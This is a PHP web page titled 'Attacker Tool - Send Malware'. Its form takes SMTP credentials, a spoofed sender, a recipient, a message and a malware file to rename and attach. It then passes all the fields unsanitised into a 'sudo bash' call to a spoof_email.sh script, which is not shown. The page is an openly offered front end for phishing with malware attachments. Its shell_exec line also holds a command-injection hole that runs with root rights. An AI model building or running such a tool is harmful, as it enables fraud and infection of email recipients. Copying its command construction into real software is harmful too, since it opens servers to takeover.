<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect user input
    $smtp_server = $_POST['smtp_server'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $from_email = $_POST['from_email'];
    $to_email = $_POST['to_email'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];
    $message_header = $_POST['message_header'];
    $malware_file = $_POST['malware_file'];
    $new_file_name = $_POST['new_file_name'];
    
   

    // Construct the Bash command
    $bash_command = "sudo bash Scripts/spoof_email.sh  '$smtp_server' '$username' '$password' '$from_email' '$to_email' '$subject' '$message' '$message_header' '$malware_file' '$new_file_name'";

    // Execute the Bash script
    $output = shell_exec($bash_command);
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Tool - Send Malware</title>
    <style>
        /* Ensuring the whole page takes full height */
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Orbitron', sans-serif;
            background-color: #0A0A0A;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }

        h1 {
            color: #FF0000;
            text-align: center;
            text-transform: uppercase;
            font-size: 2rem;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #FF0000;
        }

        form {
            background-color: #222;
            padding: 30px;
            border-radius: 10px;
            border: 2px solid #FF0000;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.6);
            width: 100%;
            max-width: 600px;
            margin: auto;
        }

        label, input, textarea {
            font-size: 1.2rem;
            color: #fff;
        }

        input[type="text"], input[type="email"], input[type="password"], textarea {
            background-color: #333;
            border: 1px solid #FF0000;
            color: #fff;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            font-size: 1rem;
        }

        input[type="submit"] {
            background-color: #FF0000;
            color: #fff;
            border: none;
            padding: 15px;
            font-size: 1.5rem;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s ease;
            border-radius: 5px;
        }

        input[type="submit"]:hover {
            background-color: #D70000;
        }

        textarea {
            resize: vertical;
            min-height: 100px;
        }

        input[type="text"], input[type="email"], input[type="password"], textarea:focus {
            outline: none;
            box-shadow: 0 0 5px #FF0000;
        }

        .container {
            width: 100%;
            max-width: 800px;
            margin: auto;
        }

        .warning {
            color: #FF0000;
            font-weight: bold;
            text-align: center;
        }

    </style>
</head>
<body>
    <div class="container">
        <h1>Send Malware - Attacker Tool</h1>
        <form method="POST">
            <label for="smtp_server">SMTP Server:</label>
            <input type="text" id="smtp_server" name="smtp_server" required><br><br>

            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required><br><br>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required><br><br>

            <label for="from_email">From Email:</label>
            <input type="email" id="from_email" name="from_email" required><br><br>

            <label for="to_email">To Email:</label>
            <input type="email" id="to_email" name="to_email" required><br><br>

            <label for="subject">Subject:</label>
            <input type="text" id="subject" name="subject" required><br><br>

            <label for="message">Message:</label><br>
            <textarea id="message" name="message" required></textarea><br><br>

            <label for="message_header">Message Header:</label><br>
            <input type="text" id="message_header" name="message_header" required><br><br>

            <label for="malware_file">Malware File:</label>
            <input type="text" id="malware_file" name="malware_file" required><br><br>

            <label for="new_file_name">New File Name (without extension):</label>
            <input type="text" id="new_file_name" name="new_file_name" required><br><br>

            <input type="submit" value="Execute Attack">
        </form>

        <div class="warning">
            <p>⚠️ WARNING: Use this tool responsibly! ⚠️</p>
        </div>
    </div>
</body>
</html>
